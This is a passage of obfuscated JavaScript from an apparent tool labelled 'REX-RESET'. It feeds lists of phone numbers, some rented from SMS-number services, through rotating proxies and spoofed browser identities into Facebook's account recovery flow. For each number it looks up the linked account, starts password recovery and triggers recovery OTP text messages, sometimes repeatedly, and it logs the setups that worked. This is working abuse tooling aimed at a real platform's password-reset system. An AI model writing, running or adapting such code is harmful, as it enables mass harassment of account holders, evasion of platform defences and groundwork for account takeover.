      const fn23 = v1475 => v1475 && !v1475.startsWith(':') && !/^[\d,]+$/.test(v1475) && v1475.length > 0xa,
        v1455 = v1449.match(/"__hsdp"\s*:\s*"([^"]+)"/);
      v1455 && fn23(v1455[0x1]) && (v1396.__hsdp_code = v1455[0x1], dbg("[SEND] __hsdp_code from code page (encoded)"));
      const v1456 = v1449.match(/"__hblp"\s*:\s*"([^"]+)"/);
      v1456 && fn23(v1456[0x1]) && (v1396.__hblp_code = v1456[0x1], dbg("[SEND] __hblp_code from code page (encoded)"));
      const v1457 = v1449.match(/"__sjsp"\s*:\s*"([^"]+)"/);
      v1457 && fn23(v1457[0x1]) && (v1396.__sjsp_code = v1457[0x1], dbg("[SEND] __sjsp_code from code page (encoded)"));
      dbg("[SEND] After code page: hsdp_code=" + (v1396.__hsdp_code ? "OK(" + v1396.__hsdp_code.length + ')' : "MISS") + " hblp_code=" + (v1396.__hblp_code ? 'OK' : "MISS") + " sjsp_code=" + (v1396.__sjsp_code ? 'OK' : "MISS"));
      const v1458 = v1449.match(/"__rev"\s*:\s*(\d+)/);
      v1458 && v1458[0x1] && (v1396.rev = v1458[0x1]);
      const v1459 = v1449.match(/"__spin_t"\s*:\s*(\d+)/);
      v1459 && v1459[0x1] && (v1396.spinT = v1459[0x1]);
      const v1460 = v1449.match(/"__hsi"\s*:\s*"?(\d+)"?/);
      v1460 && v1460[0x1] && (v1396.hsi = v1460[0x1]);
    } catch (v1476) {
      dbg("[SEND] Code page GET error: " + v1476.message);
    }
  }
  if (v1409.redirect_uri || v1409.status === "success" || v1409.is_success === true || v1409.sent === true) {
    const v1477 = {};
    return v1477.ok = true, v1477.sendCipher = v1413, v1477;
  }
  const v1414 = {};
  v1414.ok = false;
  return v1414.error = v1409.error_message || v1409.status || "unknown", v1414;
}
function removeNumberFromFile(v1478, v1479) {
  try {
    const v1480 = v1479.startsWith('+') ? v1479 : '+' + v1479,
      v1481 = fs.readFileSync(v1478, "utf8").split(/\r?\n/),
      v1482 = v1481.filter(v1483 => v1483.trim() !== v1480 && v1483.trim() !== v1479);
    fs.writeFileSync(v1478, v1482.join('\x0a'));
  } catch (v1484) {}
}
function withHardTimeout(v1485, v1486, v1487 = "Request") {
  return new Promise((v1488, v1489) => {
    const v1490 = setTimeout(() => v1489(new Error(v1487 + " hard timeout (" + v1486 + "ms)")), v1486);
    v1485.then(v1491 => {
      clearTimeout(v1490);
      v1488(v1491);
    }).catch(v1492 => {
      clearTimeout(v1490), v1489(v1492);
    });
  });
}
function isProxyLevelError(v1493) {
  if (!v1493) return false;
  const v1494 = (v1493.message || '').toLowerCase(),
    v1495 = (v1493.code || '').toUpperCase();
  if (v1495 === "ECONNREFUSED" || v1495 === "ECONNRESET" || v1495 === "ETIMEDOUT" || v1495 === "ENOTFOUND" || v1495 === "ECONNABORTED" || v1495 === "EHOSTUNREACH" || v1495 === "ENETUNREACH" || v1495 === "EPIPE") return true;
  if (v1494.includes("proxy tcp") || v1494.includes("proxy connection failed") || v1494.includes("socks") || v1494.includes("proxy agent") || v1494.includes("proxy authorization") || v1494.includes("proxy server returned") || v1494.includes("econnrefused") || v1494.includes("econnreset") || v1494.includes("enotfound") || v1494.includes("etimedout") || v1494.includes("ehostunreach") || v1494.includes("enetunreach") || v1494.includes("epipe")) return true;
  return false;
}
async function processNumber(v1496, v1497, v1498 = 0x32, v1499 = 0x0) {
  const v1500 = v1496.startsWith('+') ? v1496 : '+' + v1496;
  let v1501 = -1;
  let v1502 = null;
  proxyManager.hasProxies && (v1502 = proxyManager.getNext(v1500), v1501 = proxyManager.index - 0x1);
  const v1503 = getRandomClient(SELECTED_BROWSER, getSimOperators(detectCountry(v1500) || 'US')),
    v1504 = resolveLanguageForRequest(v1500);
  const v1505 = v1504.split(',')[0x0].trim().replace('-', '_'),
    v1506 = resolveTimezone(v1502, v1500),
    v1507 = {};
  v1507.host = FB_HOST === "m.facebook.com" ? "m.facebook.com" : "www.facebook.com", v1507.locale = v1505, v1507.lang = v1504;
  const v1508 = v1507;
  v1503.hostCtx = v1508;
  dbg(v1500 + " UA:[" + v1503.browserType + '/' + (v1503.isMobile ? "mob" : "desk") + "] lang=" + v1504 + " tz=" + v1506);
  const v1509 = v1503.browserType === "mweb_pixel8" || SELECTED_BROWSER === "via_browser" || v1503.browserType === "via_browser";
  if (FB_HOST === "m.facebook.com" || v1509) {
    dbg("[MFB] " + v1500 + " — routing to m.facebook.com Bloks flow");
    const v1512 = await processNumberMobile(v1496, v1502, v1503, v1504, v1499);
    if (!v1512.ok) {
      const v1514 = {};
      v1514.not_found = "no_account", v1514.bootstrap_fail = "error", v1514.search_fail = "no_account", v1514.initiate_fail = "no_sms", v1514.ar_context_exception = "error", v1514.otp_send_fail = "error", v1514.otp_not_dispatched = "error";
      const v1515 = v1514,
        v1516 = v1515[v1512.error] || "error";
      dbg("[MFB] " + v1500 + " FAIL: " + v1512.error + " → " + v1516);
      const v1517 = {};
      return v1517.result = v1516, v1517.method = "m.facebook.com Bloks", v1517.ua = v1503, v1517.proxyIdx = v1501, v1517.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1517.proxy = v1502, v1517;
    }
    dbg("[MFB] " + v1500 + " SUCCESS [m.facebook.com Bloks]");
    const v1513 = {};
    return v1513.result = "success", v1513.method = "m.facebook.com Bloks", v1513.ua = v1503, v1513.ctx = v1508, v1513.proxyIdx = v1501, v1513.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1513.proxy = v1502, v1513;
  }
  let v1510;
  const v1511 = proxyManager.hasProxies ? 0x3 : 0x1;
  for (let v1518 = 0x0; v1518 < v1511; v1518++) {
    try {
      v1510 = await withHardTimeout(getOrSeedSession(v1502, v1503, v1508), 0x61a8, "getOrSeedSession");
      if (v1510 && v1510.lsd) break;
    } catch (v1519) {
      dbg('+' + v1500 + " SEED TRY " + (v1518 + 0x1) + " FAIL (" + (v1502 ? v1502.host : "Direct") + "): " + v1519.message), invalidateSessionCache(v1502, v1503, v1508);
      if (proxyManager.hasProxies && v1518 < v1511 - 0x1) {
        if (v1501 >= 0x0 && isProxyLevelError(v1519)) proxyManager.recordFailure(v1501);
        v1502 = proxyManager.getNext(v1500), v1501 = proxyManager.index - 0x1, await sleep(0x3e8);
      } else {
        if (v1518 === v1511 - 0x1) return {
          'result': "error",
          'method': "session_seed",
          'proxyFault': isProxyLevelError(v1519),
          'ua': v1503,
          'proxyIdx': v1501,
          'proxyStr': v1502 ? v1502.host + ':' + v1502.port : "Direct",
          'proxy': v1502
        };
      }
    }
  }
  try {
    const v1520 = v1510.initialCipher ? "https://www.facebook.com/login/identify/?ci=" + v1510.initialCipher : "https://www.facebook.com/login/identify/",
      v1521 = await withHardTimeout(searchAccount(v1500, v1510, v1502, v1503, v1506, v1504, v1520), 0xea60, "searchAccount");
    if (!v1521.ok) {
      const v1531 = {};
      return v1531.result = v1521.result || "error", v1531.method = "CAAFBAccountSearchViewQuery", v1531.proxyFault = false, v1531.ua = v1503, v1531.proxyIdx = v1501, v1531.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1531.proxy = v1502, v1531;
    }
    let {
      wfId: v1522,
      evId: v1523,
      searchCipher: v1524
    } = v1521;
    dbg("[FLOW] searchCipher=" + (v1524 ? "..." + v1524.slice(-6) : "NULL") + " accounts=" + v1521.accounts.length);
    if (SELECTED_BROWSER === "via_browser" || v1503.browserType === "via_browser") {
      if (!v1524) {
        dbg('+' + v1500 + " BLOKS FAIL: no account or SMS trigger failed");
        const v1533 = {};
        return v1533.result = "no_sms", v1533.method = "via_browser Bloks", v1533.ua = v1503, v1533.proxyIdx = v1501, v1533.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1533.proxy = v1502, v1533;
      }
      dbg('+' + v1500 + " BLOKS SUCCESS [via_browser] — OTP dispatched via auth_option_selection.async");
      const v1532 = {};
      return v1532.result = "success", v1532.method = "via_browser Bloks (auth_option_selection)", v1532.ua = v1503, v1532.ctx = v1508, v1532.proxyIdx = v1501, v1532.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1532.proxy = v1502, v1532;
    }
    let v1525 = v1524;
    if (v1521.accounts.length > 0x1) {
      dbg('+' + v1500 + " MULTI: " + v1521.accounts.length + " accounts, selecting first");
      const v1534 = await withHardTimeout(selectAccount(v1521.accounts[0x0], v1524, 0x0, v1510, v1502, v1503, v1506, v1504, v1520), 0x7530, "selectAccount"),
        v1535 = {};
      v1535.result = "error", v1535.method = "useCAAAccountSearchSelectMutation", v1535.proxyFault = false, v1535.ua = v1503, v1535.proxyIdx = v1501, v1535.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1535.proxy = v1502;
      if (!v1534.ok) return v1535;
      if (v1534.selectCipher) v1525 = v1534.selectCipher;
    }
    const v1526 = await withHardTimeout(getInitiateView(v1525, v1510, v1502, v1503, v1506, v1504, v1520), 0x7530, "getInitiateView");
    if (!v1526.ok) {
      const v1536 = v1526.error === "no cipher in initiate view" || v1526.error === "no_sms" ? "no_sms" : "error",
        v1537 = {};
      return v1537.result = v1536, v1537.method = "CAAFBARInitiateViewPushableQuery", v1537.proxyFault = false, v1537.ua = v1503, v1537.proxyIdx = v1501, v1537.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1537.proxy = v1502, v1537;
    }
    const v1527 = "https://www.facebook.com/recover/initiate/?ci=" + v1525,
      v1528 = v1521.searchCuid || v1521.accounts[0x0] && v1521.accounts[0x0].cuid || null;
    await conversationalSupportQuery(v1526.cipher, v1510, v1502, v1503, v1504, v1527, v1528);
    const v1529 = await withHardTimeout(sendOTP(v1522, v1523, v1526.cipher, v1526.recoverMethod, v1510, v1502, v1503, v1506, v1504, v1527), 0xea60, "sendOTP");
    if (!v1529.ok) {
      dbg('+' + v1500 + " OTP FAIL: " + v1529.error);
      const v1538 = v1529.error === "captcha" ? "captcha" : "error",
        v1539 = {};
      return v1539.result = v1538, v1539.method = v1526.recoverMethod || "useCAASendRecoveryCodeMutation", v1539.proxyFault = false, v1539.ua = v1503, v1539.proxyIdx = v1501, v1539.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1539.proxy = v1502, v1539;
    }
    for (let v1540 = 0x0; v1540 < v1499; v1540++) {
      await sleep(0x1388), await withHardTimeout(sendOTP(v1522, v1523, v1526.cipher, v1526.recoverMethod, v1510, v1502, v1503, v1506, v1504, v1527), 0xea60, "sendOTP");
    }
    dbg('+' + v1500 + " SUCCESS [" + v1503.browserType + ']');
    const v1530 = {};
    return v1530.result = "success", v1530.method = v1526.recoverMethod || "useCAASendRecoveryCodeMutation", v1530.ua = v1503, v1530.ctx = v1508, v1530.proxyIdx = v1501, v1530.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1530.proxy = v1502, v1530;
  } catch (v1541) {
    const v1542 = isProxyLevelError(v1541);
    dbg('+' + v1500 + " EXCEPTION [proxyFault=" + v1542 + "]: " + v1541.message);
    const v1543 = {};
    return v1543.result = "error", v1543.method = typeof initiate !== "undefined" && initiate && initiate.recoverMethod || "exception", v1543.proxyFault = v1542, v1543.ua = v1503, v1543.proxyIdx = v1501, v1543.proxyStr = v1502 ? v1502.host + ':' + v1502.port : "Direct", v1543.proxy = v1502, v1543;
  }
}
const PHONE_PREFIX_MAP = [["1242", "🇧🇸", "Bahamas"], ["1246", "🇧🇧", "Barbados"], ["1264", "🇦🇮", "Anguilla"], ["1268", "🇦🇬", "Antigua"], ["1284", "🇻🇬", "British VI"], ["1340", "🇻🇮", "US VI"], ["1345", "🇰🇾", "Cayman Is."], ["1441", "🇧🇲", "Bermuda"], ["1473", "🇬🇩", "Grenada"], ["1649", "🇹🇨", "Turks & Caicos"], ["1664", "🇲🇸", "Montserrat"], ["1671", "🇬🇺", "Guam"], ["1684", "🇦🇸", "Am. Samoa"], ["1721", "🇸🇽", "Sint Maarten"], ["1758", "🇱🇨", "St. Lucia"], ["1767", "🇩🇲", "Dominica"], ["1784", "🇻🇨", "St. Vincent"], ["1868", "🇹🇹", "Trinidad"], ["1869", "🇰🇳", "St. Kitts"], ["1876", "🇯🇲", "Jamaica"], ["1939", "🇵🇷", "Puerto Rico"], ['20', "🇪🇬", "Egypt"], ["211", "🇸🇸", "S. Sudan"], ["212", "🇲🇦", "Morocco"], ["213", "🇩🇿", "Algeria"], ["216", "🇹🇳", "Tunisia"], ["218", "🇱🇾", "Libya"], ["220", "🇬🇲", "Gambia"], ["221", "🇸🇳", "Senegal"], ["222", "🇲🇷", "Mauritania"], ["223", "🇲🇱", "Mali"], ["224", "🇬🇳", "Guinea"], ["225", "🇨🇮", "Côte d'Ivoire"], ["226", "🇧🇫", "Burkina Faso"], ["227", "🇳🇪", "Niger"], ["228", "🇹🇬", "Togo"], ["229", "🇧🇯", "Benin"], ["230", "🇲🇺", "Mauritius"], ["231", "🇱🇷", "Liberia"], ["232", "🇸🇱", "Sierra Leone"], ["233", "🇬🇭", "Ghana"], ["234", "🇳🇬", "Nigeria"], ["235", "🇹🇩", "Chad"], ["236", "🇨🇫", "C. African Rep."], ["237", "🇨🇲", "Cameroon"], ["238", "🇨🇻", "Cape Verde"], ["239", "🇸🇹", "São Tomé"], ["240", "🇬🇶", "Eq. Guinea"], ["241", "🇬🇦", "Gabon"], ["242", "🇨🇬", "Congo"], ["243", "🇨🇩", "DR Congo"], ["244", "🇦🇴", "Angola"], ["245", "🇬🇼", "Guinea-Bissau"], ["247", "🇦🇨", "Ascension Is."], ["248", "🇸🇨", "Seychelles"], ["249", "🇸🇩", "Sudan"], ["250", "🇷🇼", "Rwanda"], ["251", "🇪🇹", "Ethiopia"], ["252", "🇸🇴", "Somalia"], ["253", "🇩🇯", "Djibouti"], ["254", "🇰🇪", "Kenya"], ["255", "🇹🇿", "Tanzania"], ["256", "🇺🇬", "Uganda"], ["257", "🇧🇮", "Burundi"], ["258", "🇲🇿", "Mozambique"], ["260", "🇿🇲", "Zambia"], ["261", "🇲🇬", "Madagascar"], ["262", "🇷🇪", "Réunion"], ["263", "🇿🇼", "Zimbabwe"], ["264", "🇳🇦", "Namibia"], ["265", "🇲🇼", "Malawi"], ["266", "🇱🇸", "Lesotho"], ["267", "🇧🇼", "Botswana"], ["268", "🇸🇿", "Eswatini"], ["269", "🇰🇲", "Comoros"], ['27', "🇿🇦", "South Africa"], ["290", "🇸🇭", "St. Helena"], ["291", "🇪🇷", "Eritrea"], ["297", "🇦🇼", "Aruba"], ["298", "🇫🇴", "Faroe Is."], ["299", "🇬🇱", "Greenland"], ['30', "🇬🇷", "Greece"], ['31', "🇳🇱", "Netherlands"], ['32', "🇧🇪", "Belgium"], ['33', "🇫🇷", "France"], ['34', "🇪🇸", "Spain"], ["350", "🇬🇮", "Gibraltar"], ["351", "🇵🇹", "Portugal"], ["352", "🇱🇺", "Luxembourg"], ["353", "🇮🇪", "Ireland"], ["354", "🇮🇸", "Iceland"], ["355", "🇦🇱", "Albania"], ["356", "🇲🇹", "Malta"], ["357", "🇨🇾", "Cyprus"], ["358", "🇫🇮", "Finland"], ["359", "🇧🇬", "Bulgaria"], ['36', "🇭🇺", "Hungary"], ["370", "🇱🇹", "Lithuania"], ["371", "🇱🇻", "Latvia"], ["372", "🇪🇪", "Estonia"], ["373", "🇲🇩", "Moldova"], ["374", "🇦🇲", "Armenia"], ["375", "🇧🇾", "Belarus"], ["376", "🇦🇩", "Andorra"], ["377", "🇲🇨", "Monaco"], ["378", "🇸🇲", "San Marino"], ["380", "🇺🇦", "Ukraine"], ["381", "🇷🇸", "Serbia"], ["382", "🇲🇪", "Montenegro"], ["385", "🇭🇷", "Croatia"], ["386", "🇸🇮", "Slovenia"], ["387", "🇧🇦", "Bosnia"], ["389", "🇲🇰", "N. Macedonia"], ['39', "🇮🇹", "Italy"], ['40', "🇷🇴", "Romania"], ['41', "🇨🇭", "Switzerland"], ["420", "🇨🇿", "Czechia"], ["421", "🇸🇰", "Slovakia"], ["423", "🇱🇮", "Liechtenstein"], ['43', "🇦🇹", "Austria"], ['44', "🇬🇧", 'UK'], ['45', "🇩🇰", "Denmark"], ['46', "🇸🇪", "Sweden"], ['47', "🇳🇴", "Norway"], ['48', "🇵🇱", "Poland"], ['49', "🇩🇪", "Germany"], ["500", "🇫🇰", "Falkland Is."], ["501", "🇧🇿", "Belize"], ["502", "🇬🇹", "Guatemala"], ["503", "🇸🇻", "El Salvador"], ["504", "🇭🇳", "Honduras"], ["505", "🇳🇮", "Nicaragua"], ["506", "🇨🇷", "Costa Rica"], ["507", "🇵🇦", "Panama"], ["508", "🇵🇲", "St. Pierre"], ["509", "🇭🇹", "Haiti"], ['51', "🇵🇪", "Peru"], ['52', "🇲🇽", "Mexico"], ['53', "🇨🇺", "Cuba"], ['54', "🇦🇷", "Argentina"], ['55', "🇧🇷", "Brazil"], ['56', "🇨🇱", "Chile"], ['57', "🇨🇴", "Colombia"], ['58', "🇻🇪", "Venezuela"], ["590", "🇬🇵", "Guadeloupe"], ["591", "🇧🇴", "Bolivia"], ["592", "🇬🇾", "Guyana"], ["593", "🇪🇨", "Ecuador"], ["594", "🇬🇫", "Fr. Guiana"], ["595", "🇵🇾", "Paraguay"], ["596", "🇲🇶", "Martinique"], ["597", "🇸🇷", "Suriname"], ["598", "🇺🇾", "Uruguay"], ["599", "🇨🇼", "Curaçao"], ['60', "🇲🇾", "Malaysia"], ['61', "🇦🇺", "Australia"], ['62', "🇮🇩", "Indonesia"], ['63', "🇵🇭", "Philippines"], ['64', "🇳🇿", "New Zealand"], ['65', "🇸🇬", "Singapore"], ['66', "🇹🇭", "Thailand"], ["670", "🇹🇱", "Timor-Leste"], ["673", "🇧🇳", "Brunei"], ["674", "🇳🇷", "Nauru"], ["675", "🇵🇬", "Papua NG"], ["676", "🇹🇴", "Tonga"], ["677", "🇸🇧", "Solomon Is."], ["678", "🇻🇺", "Vanuatu"], ["679", "🇫🇯", "Fiji"], ["680", "🇵🇼", "Palau"], ["685", "🇼🇸", "Samoa"], ["686", "🇰🇮", "Kiribati"], ["688", "🇹🇻", "Tuvalu"], ["689", "🇵🇫", "Fr. Polynesia"], ["691", "🇫🇲", "Micronesia"], ["692", "🇲🇭", "Marshall Is."], ['7', "🇷🇺", "Russia"], ['81', "🇯🇵", "Japan"], ['82', "🇰🇷", "South Korea"], ['84', "🇻🇳", "Vietnam"], ["850", "🇰🇵", "North Korea"], ["852", "🇭🇰", "Hong Kong"], ["853", "🇲🇴", "Macau"], ["855", "🇰🇭", "Cambodia"], ["856", "🇱🇦", "Laos"], ['86', "🇨🇳", "China"], ["880", "🇧🇩", "Bangladesh"], ["886", "🇹🇼", "Taiwan"], ['90', "🇹🇷", "Turkey"], ['91', "🇮🇳", "India"], ['92', "🇵🇰", "Pakistan"], ['93', "🇦🇫", "Afghanistan"], ['94', "🇱🇰", "Sri Lanka"], ['95', "🇲🇲", "Myanmar"], ["960", "🇲🇻", "Maldives"], ["961", "🇱🇧", "Lebanon"], ["962", "🇯🇴", "Jordan"], ["963", "🇸🇾", "Syria"], ["964", "🇮🇶", "Iraq"], ["965", "🇰🇼", "Kuwait"], ["966", "🇸🇦", "Saudi Arabia"], ["967", "🇾🇪", "Yemen"], ["968", "🇴🇲", "Oman"], ["970", "🇵🇸", "Palestine"], ["971", "🇦🇪", "UAE"], ["972", "🇮🇱", "Israel"], ["973", "🇧🇭", "Bahrain"], ["974", "🇶🇦", "Qatar"], ["975", "🇧🇹", "Bhutan"], ["976", "🇲🇳", "Mongolia"], ["977", "🇳🇵", "Nepal"], ['98', "🇮🇷", "Iran"], ["992", "🇹🇯", "Tajikistan"], ["993", "🇹🇲", "Turkmenistan"], ["994", "🇦🇿", "Azerbaijan"], ["995", "🇬🇪", "Georgia"], ["996", "🇰🇬", "Kyrgyzstan"], ["998", "🇺🇿", "Uzbekistan"], ['1', "🇺🇸", "USA/Canada"]];
function getPhoneCountry(v1544) {
  const v1545 = v1544.replace(/^\+/, '').replace(/^0+/, '');
  for (const [v1547, v1548, v1549] of PHONE_PREFIX_MAP) {
    const v1550 = {};
    v1550.flag = v1548, v1550.name = v1549;
    if (v1545.startsWith(v1547)) return v1550;
  }
  const v1546 = {};
  return v1546.flag = '🌐', v1546.name = "Unknown", v1546;
}
function getProxyCountry(v1551) {
  if (!v1551 || !v1551.user) return null;
  const v1552 = v1551.user;
  const v1553 = v1552.match(/(?:country|cc|cr|zone|region|geo)[-_.]?([a-zA-Z]{2})(?:[-_.]|$)/i) || v1552.match(/[-_]([a-zA-Z]{2})[-_]sess/i) || v1552.match(/_([a-zA-Z]{2})$/i);
  if (!v1553) return null;
  const v1554 = v1553[0x1].toUpperCase();
  const v1555 = [...v1554].map(v1557 => String.fromCodePoint(v1557.codePointAt(0x0) + 0x1f1a5)).join(''),
    v1556 = {};
  v1556.iso = v1554, v1556.flag = v1555;
  return v1556;
}
class Dashboard {
  constructor(v1558) {
    this.totalNumbers = v1558, this.processed = 0x0, this.successful = 0x0, this.noAccount = 0x0, this.noSms = 0x0, this.captcha = 0x0, this.errors = 0x0;
    const v1559 = path.join(__dirname, "results");
    if (!fs.existsSync(v1559)) try {
      const v1562 = {};
      v1562.recursive = true, fs.mkdirSync(v1559, v1562);
    } catch (v1563) {}
    this.liveLogFile = path.join(v1559, "console_output.log"), this.workingSetupsFile = path.join(v1559, "working_setups.txt");
    const v1560 = new Date().toLocaleString(),
      v1561 = "\n================================================================================\n" + ("=== Session Started: " + v1560 + " | Target Count: " + v1558 + " ===\n") + "================================================================================\n";
    try {
      fs.appendFileSync(this.liveLogFile, v1561), fs.appendFileSync(this.workingSetupsFile, v1561);
    } catch (v1564) {}
  }
  ["record"](v1565, v1566, v1567, v1568, v1569, v1570, v1571 = '') {
    this.processed++;
    let v1572 = '';
    const v1573 = getPhoneCountry(v1566),
      v1574 = getProxyCountry(v1570),
      v1575 = v1568 && v1568.lang ? v1568.lang.split(',')[0x0].trim() : '',
      v1576 = FB_MUTED('\x20[' + v1573.flag + v1573.name + (v1574 ? " │ Proxy:" + v1574.flag + v1574.iso : '') + (v1575 ? " │ " + v1575 : '') + ']');
    let v1577 = "Unknown",
      v1578 = "Unknown";
    let v1579 = "Desktop";
    if (v1567 && v1567.browserType) {
      const v1581 = {};
      v1581.chrome = "Chrome", v1581.firefox = "Firefox", v1581.edge = "Edge", v1581.samsung = "Samsung", v1581.duckduckgo = "DuckDuckGo", v1581.opera = "Opera", v1581.brave = "Brave", v1581.vivaldi = "Vivaldi", v1581.safari = "Safari", v1581.via_browser = "Via", v1581.mweb_pixel8 = "Mweb";
      const v1582 = v1581;
      v1578 = v1582[v1567.browserType] || v1567.browserType, v1579 = v1567.isMobile ? "Mobile" : "Desktop";
      const v1583 = v1567.isMobile ? '📱' : '🖥';
      v1577 = '' + v1583 + v1578;
    }
    const v1580 = FB_MUTED('\x20[' + v1577 + ']');
    if (v1565 === "success") this.successful++, v1572 = chalk.hex("#00FF88")("REX — Reset │ OTP Sent → ") + chalk.hex("#FCAF45").bold(v1566) + v1580 + v1576;else {
      if (v1565 === "no_account") this.noAccount++, v1572 = chalk.hex("#FF4466")("REX — Reset │ No Account → ") + chalk.hex("#888888")(v1566) + v1580 + v1576;else {
        if (v1565 === "no_sms") this.noSms++, v1572 = chalk.hex("#FF9900")("REX — Reset │ No SMS Opt → ") + chalk.hex("#888888")(v1566) + v1580 + v1576;else {
          if (v1565 === "captcha") this.captcha++, v1572 = chalk.hex("#FF9900")("REX — Reset │ Captcha Block → ") + chalk.hex("#888888")(v1566) + v1580 + v1576;else v1565 === "confirmed_auto" ? v1572 = chalk.hex("#00F0FF")("REX — Reset │ Confirmed Auto → ") + chalk.hex("#00FF88").bold(v1566) + v1580 + v1576 : (this.errors++, v1572 = chalk.hex("#FF4466")("REX — Reset │ Failed/Drop → ") + chalk.hex("#888888")(v1566) + v1580 + v1576);
        }
      }
    }
    process.stdout.write("\r[K" + v1572 + '\x0a'), this.render();
    try {
      const v1584 = new Date().toISOString().replace('T', '\x20').slice(0x0, 0x13),
        v1585 = v1572.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '').trim(),
        v1586 = v1569 || (v1570 ? v1570.host + ':' + v1570.port : "Direct"),
        v1587 = v1574 ? v1586 + '\x20(' + v1574.iso + '\x20' + v1574.flag + ')' : v1586,
        v1588 = v1567 && v1567.userAgent ? v1567.userAgent : "Unknown",
        v1589 = v1571 || (v1565 === "success" ? "send_sms:0" : "n/a"),
        v1590 = '[' + v1584 + ']\x20' + v1585 + " │ Method: " + v1589 + " │ Proxy: " + v1587 + " │ UA: " + v1588 + '\x0a';
      fs.appendFileSync(this.liveLogFile, v1590);
      if (v1565 === "success" || v1565 === "confirmed_auto") {
        const v1591 = '[' + v1584 + "] SUCCESS | Phone: " + v1566 + " | Method: " + v1589 + " | Browser: " + v1579 + '/' + v1578 + " | Proxy: " + v1587 + " | Country: " + v1573.flag + v1573.name + " | UA: " + v1588 + '\x0a';
        fs.appendFileSync(this.workingSetupsFile, v1591);
      }
    } catch (v1592) {}
  }
  ["render"]() {
    const v1593 = (this.processed / Math.max(this.totalNumbers, 0x1) * 0x64).toFixed(0x1),
      v1594 = '\x20\x20' + W.bold("REX-RESET") + " ⮞ [" + this.processed + '/' + this.totalNumbers + ']\x20' + v1593 + "% │ " + B("OK: " + this.successful) + " │ " + R("Err: " + (this.noAccount + this.noSms + this.captcha + this.errors));
    process.stdout.write("\r[K" + v1594);
  }
  ["stop"]() {
    console.log('\x0a');
    try {
      const v1595 = "\n--- Finished [Processed: " + this.processed + " | Successful: " + this.successful + " | NoAccount: " + this.noAccount + " | NoSms: " + this.noSms + " | Captcha: " + this.captcha + " | Errors: " + this.errors + "] ---\n\n";
      fs.appendFileSync(this.liveLogFile, v1595), fs.appendFileSync(this.workingSetupsFile, v1595);
    } catch (v1596) {}
  }
}
async function runPool(v1597, v1598, v1599, v1600, v1601 = null, v1602 = 0x0, v1603 = 0x0, v1604 = null, v1605 = null, v1606 = null) {
  const v1607 = v1601 || v1604 || v1605 || v1606,
    v1608 = new Dashboard(v1607 ? v1607.totalCount : v1597.length);
  const v1609 = {};
  v1609.success = [], v1609.noAccount = [], v1609.noSms = [], v1609.captcha = [], v1609.errors = [];
  const v1610 = v1609;
  let v1611 = [],
    v1612 = [],
    v1613 = 0x0,
    v1614 = false;
  const v1615 = new Map();
  if (v1601 || v1604) (async () => {
    try {
      for (let v1622 = 0x0; v1622 < v1607.totalCount; v1622++) {
        try {
          const v1623 = v1607.ranges[Math.floor(Math.random() * v1607.ranges.length)];
          let v1624;
          v1601 ? v1624 = await nexaLimiter.enqueue(() => nexaFetchNumber(v1601.apiKey, v1623, v1601.serverEndpoint)) : v1624 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v1604.apiKey, v1623, v1604.getPath)), v1624 && (v1613++, v1612.length > 0x0 ? v1612.shift()(v1624) : v1611.push(v1624));
        } catch (v1625) {
          if (v1625.message.includes("Insufficient balance")) break;
          if (v1625.message.includes("No numbers available")) continue;
        }
      }
    } finally {
      v1614 = true;
      while (v1612.length > 0x0) v1612.shift()(null);
    }
  })();else {
    if (v1605) {
      const v1626 = v1605;
      (async () => {
        let v1627 = 0x0,
          v1628 = 0x0;
        try {
          for (let v1629 = 0x0; v1629 < v1626.totalCount; v1629++) {
            try {
              const {
                activationId: v1630,
                phoneNumber: v1631
              } = await smsBowerFetchNumber(v1626.apiKey, v1626.service, v1626.country, v1626.maxPrice);
              v1615.set(v1631, v1630), v1627++, v1628 = 0x0;
              if (v1612.length > 0x0) v1612.shift()(v1631);else v1611.push(v1631);
            } catch (v1632) {
              v1628++;
              if (v1628 >= 0x5 && v1627 === 0x0) break;
              await new Promise(v1633 => setTimeout(v1633, 0x7d0));
            }
          }
        } finally {
          v1614 = true;
          while (v1612.length > 0x0) v1612.shift()(null);
        }
      })();
    } else {
      if (v1606) {
        const v1634 = v1606;
        (async () => {
          let v1635 = 0x0,
            v1636 = 0x0;
          try {
            for (let v1637 = 0x0; v1637 < v1634.totalCount; v1637++) {
              try {
                const v1638 = v1634.ranges[Math.floor(Math.random() * v1634.ranges.length)],
                  v1639 = await zenexFetchNumber(v1634.apiKey, v1638);
                v1635++, v1636 = 0x0;
                if (v1612.length > 0x0) v1612.shift()(v1639);else v1611.push(v1639);
              } catch (v1640) {
                v1636++;
                if (v1636 >= 0x5 && v1635 === 0x0) break;
                await new Promise(v1641 => setTimeout(v1641, 0x7d0));
              }
            }
          } finally {
            v1614 = true;
            while (v1612.length > 0x0) v1612.shift()(null);
          }
        })();
      }
    }
  }
  const v1616 = !!(v1601 || v1604 || v1605 || v1606),
    v1617 = v1616 ? () => {
      if (v1611.length > 0x0) return Promise.resolve(v1611.shift());
      if (v1614) return Promise.resolve(null);
      return new Promise(v1642 => v1612.push(v1642));
    } : () => {
      if (v1597.length === 0x0) return Promise.resolve(null);
      const v1643 = Math.floor(Math.random() * v1597.length);
      return Promise.resolve(v1597.splice(v1643, 0x1)[0x0]);
    };
  async function fn24() {
    while (true) {
      const v1644 = await v1617();
      if (!v1644) break;
      let v1645;
      const v1646 = (typeof v1603 === "number" ? v1603 : 0x0) + 0x1;
      for (let v1647 = 0x1; v1647 <= v1646; v1647++) {
        v1645 = await processNumber(v1644, v1599, v1598, v1602);
        if (v1645.result === "success" || v1645.result === "no_account" || v1645.result === "no_sms" || v1645.result === "captcha") break;
        v1647 < v1646 && (await sleep(0x3e8));
      }
      if (v1600 && !v1616) removeNumberFromFile(v1600, v1644);
      v1608.record(v1645.result, v1644, v1645.ua, v1645.ctx, v1645.proxyStr, v1645.proxy, v1645.method);
      if (v1645.result === "success") {
